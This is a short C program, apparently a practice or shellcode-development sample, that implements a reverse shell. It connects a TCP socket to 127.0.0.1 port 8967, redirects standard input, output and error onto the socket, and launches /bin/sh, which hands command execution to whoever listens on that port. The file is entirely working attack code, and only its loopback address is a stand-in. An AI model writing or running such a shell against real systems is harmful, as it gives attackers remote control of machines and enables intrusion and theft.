#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>


int main()
{
  int sockfd = socket(AF_INET, SOCK_STREAM, 0);

  struct sockaddr_in addr;
  int sockaddr_len = sizeof(addr);
  addr.sin_family = AF_INET;
  addr.sin_port = htons(8967);
  inet_aton("127.0.0.1",(struct in_addr *) &addr.sin_addr);
  bzero(&addr.sin_zero, 8);

    /*
    sin_family (2 bytes)
    sin_port (2 bytes)
    sin_addr (4 bytes)
    sin_zero (8 bytes)
    */

  connect(sockfd, (struct sockaddr *) &addr, sockaddr_len);

  dup2(sockfd, 0);
  dup2(sockfd, 1);
  dup2(sockfd, 2);

  execve("/bin/sh", NULL, NULL);

  return 0;
}
